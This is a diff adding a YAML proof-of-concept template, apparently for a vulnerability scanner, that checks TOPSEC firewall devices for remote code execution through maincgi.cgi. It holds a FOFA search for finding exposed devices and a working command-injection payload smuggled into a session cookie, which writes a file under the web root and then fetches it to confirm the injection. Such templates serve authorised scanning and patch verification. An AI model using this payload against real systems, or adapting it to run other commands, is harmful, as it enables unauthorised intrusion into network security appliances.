@@ -1,0 +1,22 @@
+id: poc-yaml-topsec-maincgi-cgi-rce
+info:
+  name: 天融信TOPSEC maincgi.cgi 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 天融信-TOPSEC
+  fofa: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode" && is_domain=false
+variables:
+  t1: random_str(6)
+  t2: base64(t1)
+requests:
+- method: GET
+  path: /cgi/maincgi.cgi?Url=check
+  headers:
+    Cookie: session_id_443=1|echo '{{.t2}}' >> /www/htdocs/site/image/{{.t1}}.txt;
+  expression: status_code == 200
+- method: GET
+  path: /site/image/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,t2) && contains(headers,"TOPSEC")
+transport: http
